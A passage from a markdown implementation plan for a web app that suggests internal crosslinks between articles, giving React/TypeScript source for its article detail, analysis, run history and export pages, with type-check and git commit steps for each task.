  const totalPages = Math.ceil(totalRecs / limit);

  if (articleLoading) {
    return (
      <div className="flex items-center justify-center p-12">
        <div className="text-gray-500">Loading article...</div>
      </div>
    );
  }

  if (!article) {
    return (
      <div className="flex items-center justify-center p-12">
        <div className="text-red-600">Article not found</div>
      </div>
    );
  }

  return (
    <div className="mx-auto max-w-5xl p-6">
      {/* Error toast */}
      {error && (
        <div className="mb-4 rounded-lg bg-red-50 border border-red-200 p-3 text-sm text-red-800">
          {error}
          <button onClick={() => setError(null)} className="ml-2 font-medium underline">
            Dismiss
          </button>
        </div>
      )}

      {/* ArticleMeta */}
      <div className="mb-6">
        <h1 className="text-2xl font-bold text-gray-900">{article.title}</h1>
        <div className="mt-2 flex flex-wrap gap-4 text-sm text-gray-600">
          <a href={article.url} className="text-blue-600 hover:underline" target="_blank" rel="noopener noreferrer">
            {article.url}
          </a>
          <span>{article.wordCount.toLocaleString()} words</span>
          <span>Source: {article.sourceType}</span>
          <span>Added: {new Date(article.createdAt).toLocaleDateString()}</span>
        </div>
      </div>

      {/* BodyPreview (collapsible) */}
      {article.body && (
        <div className="mb-6">
          <button
            onClick={() => setBodyExpanded(!bodyExpanded)}
            className="text-sm font-medium text-blue-600 hover:underline"
          >
            {bodyExpanded ? "Hide body preview" : "Show body preview"}
          </button>
          {bodyExpanded && (
            <div className="mt-2 max-h-64 overflow-y-auto rounded border border-gray-200 bg-gray-50 p-4 text-sm text-gray-700">
              {article.body.slice(0, 2000)}
              {article.body.length > 2000 && "..."}
            </div>
          )}
        </div>
      )}

      {/* RecommendationsSection */}
      <div>
        <h2 className="mb-4 text-lg font-semibold text-gray-900">
          Recommendations ({totalRecs})
        </h2>

        {/* Filters */}
        <div className="mb-4 flex flex-wrap items-center gap-4">
          {/* Severity checkboxes */}
          <div className="flex gap-2">
            {(["critical", "warning", "info"] as const).map((sev) => (
              <label key={sev} className="flex items-center gap-1 text-sm">
                <input
                  type="checkbox"
                  checked={severityFilters.has(sev)}
                  onChange={() => toggleSeverity(sev)}
                />
                <span className="capitalize">{sev}</span>
              </label>
            ))}
          </div>

          {/* Status tabs */}
          <div className="flex rounded-lg border border-gray-200">
            {(["all", "pending", "accepted", "dismissed"] as const).map((tab) => (
              <button
                key={tab}
                onClick={() => {
                  setStatusFilter(tab);
                  setPage(1);
                }}
                className={`px-3 py-1 text-sm capitalize ${
                  statusFilter === tab
                    ? "bg-blue-600 text-white"
                    : "bg-white text-gray-600 hover:bg-gray-50"
                } ${tab === "all" ? "rounded-l-lg" : ""} ${tab === "dismissed" ? "rounded-r-lg" : ""}`}
              >
                {tab}
              </button>
            ))}
          </div>
        </div>

        {/* BulkActionBar */}
        {selectedIds.size > 0 && (
          <div className="mb-4 flex items-center gap-3 rounded-lg bg-blue-50 border border-blue-200 p-3">
            <span className="text-sm font-medium text-blue-800">
              {selectedIds.size} selected
            </span>
            <button
              onClick={() => handleBulkAction("accepted")}
              disabled={bulkLoading}
              className="rounded bg-green-600 px-3 py-1 text-sm text-white hover:bg-green-700 disabled:opacity-50"
            >
              Accept Selected
            </button>
            <button
              onClick={() => handleBulkAction("dismissed")}
              disabled={bulkLoading}
              className="rounded bg-gray-200 px-3 py-1 text-sm text-gray-700 hover:bg-gray-300 disabled:opacity-50"
            >
              Dismiss Selected
            </button>
            <button
              onClick={() => setSelectedIds(new Set())}
              className="text-sm text-gray-500 hover:underline"
            >
              Clear selection
            </button>
          </div>
        )}

        {/* Recommendation cards */}
        {recLoading ? (
          <div className="p-8 text-center text-gray-500">Loading recommendations...</div>
        ) : recommendations.length === 0 && totalRecs === 0 ? (
          <div className="rounded-lg border border-dashed border-gray-300 p-8 text-center">
            <p className="text-gray-600">
              No recommendations yet. Run an analysis to generate crosslink suggestions.
            </p>
            <a
              href="/dashboard/analyze"
              className="mt-2 inline-block text-sm text-blue-600 hover:underline"
            >
              Go to Analysis
            </a>
          </div>
        ) : recommendations.length === 0 ? (
          <div className="rounded-lg border border-dashed border-gray-300 p-8 text-center">
            <p className="text-gray-600">
              No crosslink opportunities found for this run. This typically means your
              articles already have good internal linking, or the content topics don't
              overlap enough. You can try lowering the similarity threshold in Settings.
            </p>
          </div>
        ) : (
          <div className="space-y-4">
            {recommendations.map((rec) => (
              <RecommendationCard
                key={rec.id}
                id={rec.id}
                severity={rec.severity}
                title={rec.title}
                description={rec.description}
                anchorText={rec.suggestion?.anchorText ?? ""}
                targetUrl={rec.suggestion?.targetUrl ?? rec.targetArticle?.url ?? ""}
                targetTitle={rec.targetArticle?.title ?? ""}
                sourceUrl={rec.sourceArticle?.url ?? ""}
                sourceTitle={rec.sourceArticle?.title ?? ""}
                sourceContext={rec.sourceContext}
                status={rec.status}
                confidence={rec.confidence}
                matchingApproach={rec.matchingApproach}
                updatedAt={rec.updatedAt}
                onStatusChange={handleStatusChange}
                selected={selectedIds.has(rec.id)}
                disabled={bulkLoading}
                onSelect={handleSelect}
              />
            ))}
          </div>
        )}

        {/* Pagination */}
        {totalPages > 1 && (
          <div className="mt-6 flex items-center justify-center gap-2">
            <button
              onClick={() => setPage((p) => Math.max(1, p - 1))}
              disabled={page === 1}
              className="rounded border px-3 py-1 text-sm disabled:opacity-50"
            >
              Previous
            </button>
            <span className="text-sm text-gray-600">
              Page {page} of {totalPages}
            </span>
            <button
              onClick={() => setPage((p) => Math.min(totalPages, p + 1))}
              disabled={page === totalPages}
              className="rounded border px-3 py-1 text-sm disabled:opacity-50"
            >
              Next
            </button>
          </div>
        )}
      </div>
    </div>
  );
}
```

**Verify:**

```bash
npx tsc --noEmit src/app/dashboard/articles/\[id\]/page.tsx 2>&1 | head -5
# Expected: no errors
```

### Step 6.4b.3 — Commit the article detail page

- [ ] Commit the page file

```bash
git add src/app/dashboard/articles/\[id\]/page.tsx
git commit -m "feat(ui): add article detail page with recommendations and optimistic UI

ArticleDetailPage with ArticleMeta, collapsible BodyPreview,
RecommendationsSection with severity/status filters, BulkActionBar,
RecommendationCard list, and pagination. Optimistic UI with rollback
per AAP-F2. Bulk actions with tenant isolation per AAP-B12.
401 redirect per AAP-F5. Empty and zero-results states."
```

**Expected:** Clean commit.

---

## UI Agent: Task 6.6 — Analysis Page

> **Branch:** `feature/phase-6-ui` (continues from 6.4b)
> **Depends on:** None (self-contained page)
> **Not TDD** — composition/layout page with complex async behavior.

### Step 6.6.1 — Create the analysis page directory

- [ ] Create the directory

```bash
mkdir -p src/app/dashboard/analyze
```

**Expected:** Directory exists.

### Step 6.6.2 — Write the analysis page

- [ ] Create `src/app/dashboard/analyze/page.tsx`

**File:** `src/app/dashboard/analyze/page.tsx`

```tsx
"use client";

import { useState, useEffect, useCallback, useRef } from "react";

/**
 * Analysis page with configuration, pre-run summary, and progress tracking.
 *
 * Layout per Frontend plan Section 2.6:
 * - AnalysisConfigForm (matching approach, threshold, fuzziness, max links, article scope)
 * - PreRunSummary (after Preview click): articles, embeddings cached vs needing generation, cost
 * - RunAnalysisButton / CancelButton
 * - AnalysisProgress (poll with exponential backoff)
 *
 * [AAP-O8] PreRunSummary calls POST /api/analyze with dryRun: true for estimate.
 *          User must click "Confirm" to start actual analysis.
 * [AAP-F4] CancelButton triggers POST /api/runs/[id]/cancel.
 * [AAP-F1] AnalysisProgress polls with exponential backoff on failures:
 *          5s -> 10s -> 20s -> 30s cap. Pauses when tab hidden.
 *          Stops on completed, failed, cancelled.
 */

type MatchingApproach = "keyword" | "semantic" | "both";
type RunStatus = "pending" | "running" | "completed" | "failed" | "cancelled";

interface AnalysisConfig {
  matchingApproach: MatchingApproach;
  similarityThreshold: number;
  fuzzinessThreshold: number;
  maxLinksPerPage: number;
  articleScope: "all" | "selected";
  selectedArticleIds?: string[];
}

interface DryRunResult {
  totalArticles: number;
  embeddingsCached: number;
  embeddingsNeeded: number;
  estimatedCost: number;
  estimatedDuration: string;
}

interface AnalysisRun {
  id: string;
  status: RunStatus;
  progress?: number;
  totalArticles?: number;
  processedArticles?: number;
  recommendationCount?: number;
  error?: string;
  createdAt: string;
  completedAt?: string;
}

const DEFAULT_CONFIG: AnalysisConfig = {
  matchingApproach: "keyword",
  similarityThreshold: 0.7,
  fuzzinessThreshold: 0.8,
  maxLinksPerPage: 5,
  articleScope: "all",
};

// [AAP-F1] Exponential backoff constants
const BASE_POLL_INTERVAL = 5000; // 5s
const MAX_POLL_INTERVAL = 30000; // 30s cap
const BACKOFF_MULTIPLIER = 2;

export default function AnalyzePage() {
  const [config, setConfig] = useState<AnalysisConfig>(DEFAULT_CONFIG);
  const [dryRunResult, setDryRunResult] = useState<DryRunResult | null>(null);
  const [dryRunLoading, setDryRunLoading] = useState(false);
  const [currentRun, setCurrentRun] = useState<AnalysisRun | null>(null);
  const [error, setError] = useState<string | null>(null);

  // [AAP-F1] Polling state
  const pollIntervalRef = useRef(BASE_POLL_INTERVAL);
  const pollTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const consecutiveFailuresRef = useRef(0);

  // [AAP-O8] Dry run: get estimate without starting analysis
  const handlePreview = useCallback(async () => {
    setDryRunLoading(true);
    setError(null);
    try {
      const res = await fetch("/api/analyze", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ...config, dryRun: true }),
      });
      if (res.status === 401) {
        window.location.href = `/auth/sign-in?callbackUrl=${encodeURIComponent(window.location.pathname)}`;
        return;
      }
      if (!res.ok) throw new Error("Failed to get analysis estimate");
      const data = await res.json();
      setDryRunResult(data);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Preview failed");
    } finally {
      setDryRunLoading(false);
    }
  }, [config]);

  // Start actual analysis
  const handleConfirm = useCallback(async () => {
    setError(null);
    try {
      const res = await fetch("/api/analyze", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(config),
      });
      if (!res.ok) throw new Error("Failed to start analysis");
      const data = await res.json();
      setCurrentRun(data);
      setDryRunResult(null);
      consecutiveFailuresRef.current = 0;
      pollIntervalRef.current = BASE_POLL_INTERVAL;
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed to start analysis");
    }
  }, [config]);

  // [AAP-F4] Cancel analysis
  const handleCancel = useCallback(async () => {
    if (!currentRun) return;
    try {
      const res = await fetch(`/api/runs/${currentRun.id}/cancel`, {
        method: "POST",
      });
      if (!res.ok) throw new Error("Failed to cancel analysis");
      setCurrentRun((prev) => (prev ? { ...prev, status: "cancelled" } : null));
    } catch (err) {
      setError(err instanceof Error ? err.message : "Cancel failed");
    }
  }, [currentRun]);

  // [AAP-F1] Poll with exponential backoff
  const pollRunStatus = useCallback(async () => {
    if (!currentRun) return;

    try {
      const res = await fetch(`/api/runs/${currentRun.id}`);
      if (!res.ok) throw new Error("Poll failed");
      const data = await res.json();
      setCurrentRun(data);

      // Reset backoff on success
      consecutiveFailuresRef.current = 0;
      pollIntervalRef.current = BASE_POLL_INTERVAL;

      // Stop polling on terminal status
      if (["completed", "failed", "cancelled"].includes(data.status)) {
        return;
      }

      // Schedule next poll
      pollTimerRef.current = setTimeout(pollRunStatus, pollIntervalRef.current);
    } catch {
      // [AAP-F1] Exponential backoff on failure
      consecutiveFailuresRef.current += 1;
      pollIntervalRef.current = Math.min(
        BASE_POLL_INTERVAL * Math.pow(BACKOFF_MULTIPLIER, consecutiveFailuresRef.current),
        MAX_POLL_INTERVAL
      );
      pollTimerRef.current = setTimeout(pollRunStatus, pollIntervalRef.current);
    }
  }, [currentRun]);

  // Start/stop polling based on currentRun status
  useEffect(() => {
    if (
      currentRun &&
      !["completed", "failed", "cancelled"].includes(currentRun.status)
    ) {
      pollTimerRef.current = setTimeout(pollRunStatus, pollIntervalRef.current);
    }

    return () => {
      if (pollTimerRef.current) {
        clearTimeout(pollTimerRef.current);
      }
    };
  }, [currentRun, pollRunStatus]);

  // [AAP-F1] Pause polling when tab hidden
  useEffect(() => {
    const handleVisibility = () => {
      if (document.visibilityState === "hidden") {
        if (pollTimerRef.current) {
          clearTimeout(pollTimerRef.current);
          pollTimerRef.current = null;
        }
      } else if (
        currentRun &&
        !["completed", "failed", "cancelled"].includes(currentRun.status)
      ) {
        // Resume polling immediately when tab becomes visible
        pollRunStatus();
      }
    };

    document.addEventListener("visibilitychange", handleVisibility);
    return () => document.removeEventListener("visibilitychange", handleVisibility);
  }, [currentRun, pollRunStatus]);

  const isRunning =
    currentRun &&
    !["completed", "failed", "cancelled"].includes(currentRun.status);

  return (
    <div className="mx-auto max-w-3xl p-6">
      <h1 className="mb-6 text-2xl font-bold text-gray-900">Run Analysis</h1>

      {/* Error display */}
      {error && (
        <div className="mb-4 rounded-lg bg-red-50 border border-red-200 p-3 text-sm text-red-800">
          {error}
          <button onClick={() => setError(null)} className="ml-2 font-medium underline">
            Dismiss
          </button>
        </div>
      )}

      {/* AnalysisConfigForm */}
      {!isRunning && (
        <div className="mb-6 rounded-lg border border-gray-200 bg-white p-6">
          <h2 className="mb-4 text-lg font-semibold text-gray-900">Configuration</h2>

          {/* MatchingApproachSelector */}
          <div className="mb-4">
            <label className="mb-1 block text-sm font-medium text-gray-700">
              Matching Approach
            </label>
            <p className="mb-2 text-xs text-gray-500">
              Tip: Keyword matching is fast and finds obvious opportunities. Semantic
              matching takes longer but discovers deeper connections.
            </p>
            <div className="flex gap-4">
              {(["keyword", "semantic", "both"] as const).map((approach) => (
                <label key={approach} className="flex items-center gap-1.5 text-sm">
                  <input
                    type="radio"
                    name="matchingApproach"
                    value={approach}
                    checked={config.matchingApproach === approach}
                    onChange={() =>
                      setConfig((prev) => ({ ...prev, matchingApproach: approach }))
                    }
                  />
                  <span className="capitalize">{approach}</span>
                </label>
              ))}
            </div>
          </div>

          {/* ThresholdSlider */}
          {(config.matchingApproach === "semantic" ||
            config.matchingApproach === "both") && (
            <div className="mb-4">
              <label className="mb-1 block text-sm font-medium text-gray-700">
                Similarity Threshold: {config.similarityThreshold.toFixed(2)}
              </label>
              <input
                type="range"
                min="0.5"
                max="1.0"
                step="0.05"
                value={config.similarityThreshold}
                onChange={(e) =>
                  setConfig((prev) => ({
                    ...prev,
                    similarityThreshold: parseFloat(e.target.value),
                  }))
                }
                className="w-full"
              />
              <div className="flex justify-between text-xs text-gray-400">
                <span>0.50 (broad)</span>
                <span>1.00 (strict)</span>
              </div>
            </div>
          )}

          {/* FuzzinessSlider */}
          {(config.matchingApproach === "keyword" ||
            config.matchingApproach === "both") && (
            <div className="mb-4">
              <label className="mb-1 block text-sm font-medium text-gray-700">
                Keyword Fuzziness: {config.fuzzinessThreshold.toFixed(2)}
              </label>
              <input
                type="range"
                min="0.6"
                max="1.0"
                step="0.05"
                value={config.fuzzinessThreshold}
                onChange={(e) =>
                  setConfig((prev) => ({
                    ...prev,
                    fuzzinessThreshold: parseFloat(e.target.value),
                  }))
                }
                className="w-full"
              />
              <div className="flex justify-between text-xs text-gray-400">
                <span>0.60 (fuzzy)</span>
                <span>1.00 (exact)</span>
              </div>
            </div>
          )}

          {/* MaxLinksPerPageInput */}
          <div className="mb-4">
            <label className="mb-1 block text-sm font-medium text-gray-700">
              Max Links per Page
            </label>
            <input
              type="number"
              min="1"
              max="50"
              value={config.maxLinksPerPage}
              onChange={(e) =>
                setConfig((prev) => ({
                  ...prev,
                  maxLinksPerPage: parseInt(e.target.value, 10) || 5,
                }))
              }
              className="w-24 rounded border border-gray-300 px-3 py-1.5 text-sm"
            />
          </div>

          {/* ArticleScopeSelector */}
          <div className="mb-6">
            <label className="mb-1 block text-sm font-medium text-gray-700">
              Article Scope
            </label>
            <div className="flex gap-4">
              <label className="flex items-center gap-1.5 text-sm">
                <input
                  type="radio"
                  name="articleScope"
                  value="all"
                  checked={config.articleScope === "all"}
                  onChange={() =>
                    setConfig((prev) => ({ ...prev, articleScope: "all" }))
                  }
                />
                All articles
              </label>
              <label className="flex items-center gap-1.5 text-sm">
                <input
                  type="radio"
                  name="articleScope"
                  value="selected"
                  checked={config.articleScope === "selected"}
                  onChange={() =>
                    setConfig((prev) => ({ ...prev, articleScope: "selected" }))
                  }
                />
                Selected articles
              </label>
            </div>
          </div>

          {/* Preview button */}
          <button
            onClick={handlePreview}
            disabled={dryRunLoading}
            className="rounded bg-gray-100 px-4 py-2 text-sm font-medium text-gray-700 hover:bg-gray-200 disabled:opacity-50"
          >
            {dryRunLoading ? "Estimating..." : "Preview Analysis"}
          </button>
        </div>
      )}

      {/* [AAP-O8] PreRunSummary */}
      {dryRunResult && !isRunning && (
        <div className="mb-6 rounded-lg border border-blue-200 bg-blue-50 p-6">
          <h2 className="mb-3 text-lg font-semibold text-blue-900">Analysis Estimate</h2>
          <dl className="grid grid-cols-2 gap-3 text-sm">
            <div>
              <dt className="text-blue-700">Articles to analyze</dt>
              <dd className="font-semibold text-blue-900">{dryRunResult.totalArticles}</dd>
            </div>
            <div>
              <dt className="text-blue-700">Embeddings cached</dt>
              <dd className="font-semibold text-blue-900">{dryRunResult.embeddingsCached}</dd>
            </div>
            <div>
              <dt className="text-blue-700">Embeddings to generate</dt>
              <dd className="font-semibold text-blue-900">{dryRunResult.embeddingsNeeded}</dd>
            </div>
            <div>
              <dt className="text-blue-700">Estimated cost</dt>
              <dd className="font-semibold text-blue-900">
                ${dryRunResult.estimatedCost.toFixed(4)}
              </dd>
            </div>
            <div className="col-span-2">
              <dt className="text-blue-700">Estimated duration</dt>
              <dd className="font-semibold text-blue-900">{dryRunResult.estimatedDuration}</dd>
            </div>
          </dl>

          <div className="mt-4 flex gap-3">
            <button
              onClick={handleConfirm}
              className="rounded bg-blue-600 px-4 py-2 text-sm font-medium text-white hover:bg-blue-700"
            >
              Confirm & Start Analysis
            </button>
            <button
              onClick={() => setDryRunResult(null)}
              className="rounded bg-white px-4 py-2 text-sm font-medium text-gray-700 border border-gray-300 hover:bg-gray-50"
            >
              Cancel
            </button>
          </div>
        </div>
      )}

      {/* AnalysisProgress */}
      {currentRun && (
        <div className="rounded-lg border border-gray-200 bg-white p-6">
          <div className="mb-4 flex items-center justify-between">
            <h2 className="text-lg font-semibold text-gray-900">
              Analysis {currentRun.status === "completed" ? "Complete" : "Progress"}
            </h2>
            <span
              className={`inline-flex items-center rounded-full px-2.5 py-0.5 text-xs font-medium ${
                currentRun.status === "completed"
                  ? "bg-green-100 text-green-800"
                  : currentRun.status === "failed"
                    ? "bg-red-100 text-red-800"
                    : currentRun.status === "cancelled"
                      ? "bg-gray-100 text-gray-600"
                      : "bg-blue-100 text-blue-800"
              }`}
            >
              {currentRun.status}
            </span>
          </div>

          {/* Progress bar */}
          {currentRun.progress !== undefined && (
            <div className="mb-4">
              <div className="mb-1 flex justify-between text-sm text-gray-600">
                <span>
                  {currentRun.processedArticles ?? 0} / {currentRun.totalArticles ?? 0} articles
                </span>
                <span>{Math.round(currentRun.progress)}%</span>
              </div>
              <div className="h-2 w-full overflow-hidden rounded-full bg-gray-200">
                <div
                  className="h-full rounded-full bg-blue-600 transition-all"
                  style={{ width: `${currentRun.progress}%` }}
                />
              </div>
            </div>
          )}

          {/* Completion stats */}
          {currentRun.status === "completed" && (
            <div className="mb-4 text-sm text-gray-600">
              <p>
                Found {currentRun.recommendationCount ?? 0} recommendations across{" "}
                {currentRun.totalArticles ?? 0} articles.
              </p>
            </div>
          )}

          {/* Error message */}
          {currentRun.status === "failed" && currentRun.error && (
            <div className="mb-4 rounded bg-red-50 p-3 text-sm text-red-800">
              {currentRun.error}
            </div>
          )}

          {/* [AAP-F4] Cancel button */}
          {isRunning && (
            <button
              onClick={handleCancel}
              className="rounded bg-red-100 px-4 py-2 text-sm font-medium text-red-800 hover:bg-red-200"
            >
              Cancel Analysis
            </button>
          )}

          {/* Start new analysis after completion */}
          {!isRunning && (
            <button
              onClick={() => {
                setCurrentRun(null);
                setDryRunResult(null);
              }}
              className="rounded bg-gray-100 px-4 py-2 text-sm font-medium text-gray-700 hover:bg-gray-200"
            >
              New Analysis
            </button>
          )}
        </div>
      )}

      {/* Free tier messaging */}
      {config.matchingApproach === "keyword" && (
        <div className="mt-4 rounded-lg border border-gray-200 bg-gray-50 p-4 text-sm text-gray-600">
          Keyword matching found opportunities. Unlock semantic matching on Pro to
          discover connections based on topic similarity.
        </div>
      )}
    </div>
  );
}
```

**Verify:**

```bash
npx tsc --noEmit src/app/dashboard/analyze/page.tsx 2>&1 | head -5
# Expected: no errors
```

### Step 6.6.3 — Commit the analysis page

- [ ] Commit the page file

```bash
git add src/app/dashboard/analyze/page.tsx
git commit -m "feat(ui): add analysis page with pre-run summary and exponential backoff

AnalysisConfigForm with matching approach, thresholds, max links, article scope.
PreRunSummary via dryRun: true per AAP-O8. CancelButton per AAP-F4.
AnalysisProgress polls with exponential backoff (5s->10s->20s->30s cap) per
AAP-F1. Pauses when tab hidden. Stops on terminal status."
```

**Expected:** Clean commit.

---

## UI Agent: Task 6.7 — Runs History Page

> **Branch:** `feature/phase-6-ui` (continues from 6.6)
> **Depends on:** None (self-contained page)
> **Not TDD** — composition/layout page.

### Step 6.7.1 — Create the runs page directory

- [ ] Create the directory

```bash
mkdir -p src/app/dashboard/runs
```

**Expected:** Directory exists.

### Step 6.7.2 — Write the runs history page

- [ ] Create `src/app/dashboard/runs/page.tsx`

**File:** `src/app/dashboard/runs/page.tsx`

```tsx
"use client";

import { useState, useEffect, useCallback, useRef } from "react";

/**
 * Runs history page.
 *
 * Per Frontend plan Section 2.5:
 * - RunsTable (timestamp, article count, strategy badges, rec count, status badge, duration)
 * - Running rows auto-update (poll every 5s)
 * - Empty state: "You haven't run any analyses yet."
 */

type RunStatus = "pending" | "running" | "completed" | "failed" | "cancelled";

interface AnalysisRun {
  id: string;
  status: RunStatus;
  totalArticles: number;
  recommendationCount: number;
  strategies: string[];
  duration: number | null;
  createdAt: string;
  completedAt: string | null;
}

const STATUS_STYLES: Record<RunStatus, string> = {
  pending: "bg-yellow-100 text-yellow-800",
  running: "bg-blue-100 text-blue-800",
  completed: "bg-green-100 text-green-800",
  failed: "bg-red-100 text-red-800",
  cancelled: "bg-gray-100 text-gray-600",
};

export default function RunsHistoryPage() {
  const [runs, setRuns] = useState<AnalysisRun[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const pollTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const fetchRuns = useCallback(async () => {
    try {
      const res = await fetch("/api/runs");
      if (res.status === 401) {
        window.location.href = `/auth/sign-in?callbackUrl=${encodeURIComponent(window.location.pathname)}`;
        return;
      }
      if (!res.ok) throw new Error("Failed to fetch runs");
      const data = await res.json();
      setRuns(data.data);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed to load runs");
    } finally {
      setLoading(false);
    }
  }, []);

  // Initial fetch
  useEffect(() => {
    fetchRuns();
  }, [fetchRuns]);

  // Auto-update running rows every 5s
  useEffect(() => {
    const hasRunning = runs.some(
      (run) => run.status === "pending" || run.status === "running"
    );

    if (hasRunning) {
      pollTimerRef.current = setInterval(fetchRuns, 5000);
    }

    return () => {
      if (pollTimerRef.current) {
        clearInterval(pollTimerRef.current);
        pollTimerRef.current = null;
      }
    };
  }, [runs, fetchRuns]);

  function formatDuration(ms: number | null): string {
    if (ms === null) return "--";
    const seconds = Math.floor(ms / 1000);
    if (seconds < 60) return `${seconds}s`;
    const minutes = Math.floor(seconds / 60);
    const remainder = seconds % 60;
    return `${minutes}m ${remainder}s`;
  }

  function formatTimestamp(iso: string): string {
    return new Date(iso).toLocaleString();
  }

  if (loading) {
    return (
      <div className="flex items-center justify-center p-12">
        <div className="text-gray-500">Loading runs...</div>
      </div>
    );
  }

  return (
    <div className="mx-auto max-w-5xl p-6">
      <h1 className="mb-6 text-2xl font-bold text-gray-900">Analysis Runs</h1>

      {error && (
        <div className="mb-4 rounded-lg bg-red-50 border border-red-200 p-3 text-sm text-red-800">
          {error}
          <button onClick={() => setError(null)} className="ml-2 font-medium underline">
            Dismiss
          </button>
        </div>
      )}

      {runs.length === 0 ? (
        <div className="rounded-lg border border-dashed border-gray-300 p-8 text-center">
          <p className="text-gray-600">You haven&apos;t run any analyses yet.</p>
          <a
            href="/dashboard/analyze"
            className="mt-2 inline-block text-sm text-blue-600 hover:underline"
          >
            Run your first analysis
          </a>
        </div>
      ) : (
        <div className="overflow-x-auto">
          <table className="w-full border-collapse text-sm">
            <thead>
              <tr className="border-b border-gray-200 text-left">
                <th className="px-4 py-3 font-medium text-gray-600">Timestamp</th>
                <th className="px-4 py-3 font-medium text-gray-600">Articles</th>
                <th className="px-4 py-3 font-medium text-gray-600">Strategies</th>
                <th className="px-4 py-3 font-medium text-gray-600">Recommendations</th>
                <th className="px-4 py-3 font-medium text-gray-600">Status</th>
                <th className="px-4 py-3 font-medium text-gray-600">Duration</th>
              </tr>
            </thead>
            <tbody>
              {runs.map((run) => (
                <tr
                  key={run.id}
                  className="border-b border-gray-100 hover:bg-gray-50"
                >
                  <td className="px-4 py-3 text-gray-900">
                    {formatTimestamp(run.createdAt)}
                  </td>
                  <td className="px-4 py-3 text-gray-900">
                    {run.totalArticles.toLocaleString()}
                  </td>
                  <td className="px-4 py-3">
                    <div className="flex gap-1">
                      {run.strategies.map((strategy) => (
                        <span
                          key={strategy}
                          className="inline-flex rounded-full bg-purple-100 px-2 py-0.5 text-xs text-purple-800"
                        >
                          {strategy}
                        </span>
                      ))}
                    </div>
                  </td>
                  <td className="px-4 py-3 text-gray-900">
                    {run.recommendationCount.toLocaleString()}
                  </td>
                  <td className="px-4 py-3">
                    <span
                      className={`inline-flex rounded-full px-2.5 py-0.5 text-xs font-medium ${STATUS_STYLES[run.status]}`}
                    >
                      {run.status}
                      {run.status === "running" && (
                        <span className="ml-1 animate-pulse" aria-label="in progress">
                          ...
                        </span>
                      )}
                    </span>
                  </td>
                  <td className="px-4 py-3 text-gray-600">
                    {formatDuration(run.duration)}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}
```

**Verify:**

```bash
npx tsc --noEmit src/app/dashboard/runs/page.tsx 2>&1 | head -5
# Expected: no errors
```

### Step 6.7.3 — Commit the runs history page

- [ ] Commit the page file

```bash
git add src/app/dashboard/runs/page.tsx
git commit -m "feat(ui): add runs history page with auto-updating running rows

RunsTable with timestamp, article count, strategy badges, recommendation count,
status badge, and duration. Running rows auto-update via 5s polling.
Empty state links to analyze page."
```

**Expected:** Clean commit.

---

## UI Agent: Task 6.8 — Export UI Integration

> **Branch:** `feature/phase-6-ui` (continues from 6.7)
> **Depends on:** Tasks 6.4b (article detail page), 6.2a (CsvSerializer via API)
> **Not TDD** — integration of export buttons into existing pages.

### Step 6.8.1 — Create the ExportButtons component

- [ ] Create `src/components/recommendations/ExportButtons.tsx`

**File:** `src/components/recommendations/ExportButtons.tsx`

```tsx
"use client";

import { useState, useCallback } from "react";

/**
 * Export buttons for CSV and JSON download.
 *
 * Per task 6.8:
 * - "Export CSV" triggers window.location = "/api/recommendations?format=csv&..."
 * - "Export JSON" triggers download with download=true
 * - Toast: "Exported [X] recommendations as [format]."
 */

interface ExportButtonsProps {
  /** Article ID filter (optional, for article detail page) */
  articleId?: string;
  /** Analysis run ID filter (optional) */
  analysisRunId?: string;
  /** Total recommendation count for the toast message */
  totalCount: number;
  /** Additional filter params to include in the export URL */
  severity?: string;
  status?: string;
}

export function ExportButtons({
  articleId,
  analysisRunId,
  totalCount,
  severity,
  status,
}: ExportButtonsProps) {
  const [toast, setToast] = useState<string | null>(null);

  const buildQueryString = useCallback(
    (format: "csv" | "json") => {
      const params = new URLSearchParams();
      params.set("format", format);
      if (format === "json") params.set("download", "true");
      if (articleId) params.set("articleId", articleId);
      if (analysisRunId) params.set("analysisRunId", analysisRunId);
      if (severity) params.set("severity", severity);
      if (status) params.set("status", status);
      // Remove the default limit for exports
      params.set("limit", "100");
      return params.toString();
    },
    [articleId, analysisRunId, severity, status]
  );

  const handleExport = useCallback(
    (format: "csv" | "json") => {
      const query = buildQueryString(format);
      window.location.href = `/api/recommendations?${query}`;
      setToast(`Exported ${totalCount} recommendations as ${format.toUpperCase()}.`);
      setTimeout(() => setToast(null), 3000);
    },
    [buildQueryString, totalCount]
  );

  return (
    <div className="relative flex gap-2">
      <button
        onClick={() => handleExport("csv")}
        className="rounded border border-gray-300 bg-white px-3 py-1.5 text-sm font-medium text-gray-700 hover:bg-gray-50"
      >
        Export CSV
      </button>
      <button
        onClick={() => handleExport("json")}
        className="rounded border border-gray-300 bg-white px-3 py-1.5 text-sm font-medium text-gray-700 hover:bg-gray-50"
      >
        Export JSON
      </button>

      {/* Toast notification */}
      {toast && (
        <div className="absolute -top-10 left-0 rounded-lg bg-gray-900 px-3 py-1.5 text-sm text-white shadow-lg">
          {toast}
        </div>
      )}
    </div>
  );
}
```

**Verify:**

```bash
npx tsc --noEmit src/components/recommendations/ExportButtons.tsx 2>&1 | head -5
# Expected: no errors
```

### Step 6.8.2 — Commit the ExportButtons component

- [ ] Commit the component

```bash
git add src/components/recommendations/ExportButtons.tsx
git commit -m "feat(ui): add ExportButtons component for CSV/JSON download

Export CSV triggers window.location to /api/recommendations?format=csv.
Export JSON uses download=true for Content-Disposition header.
Toast notification on export. Passes through articleId, analysisRunId,
severity, and status filters to the export URL."
```

**Expected:** Clean commit. UI Agent work is complete.

---

## Integration Verification

After all three branches merge into `feature/phase-6`:

```
Phase B — sequential merge:
  1. Merge feature/phase-6-api    -> feature/phase-6
  2. Merge feature/phase-6-export -> feature/phase-6
  3. Merge feature/phase-6-ui     -> feature/phase-6
  4. Integration verification pass (this section)
  5. PR feature/phase-6 -> develop
```

### Merge Order Rationale

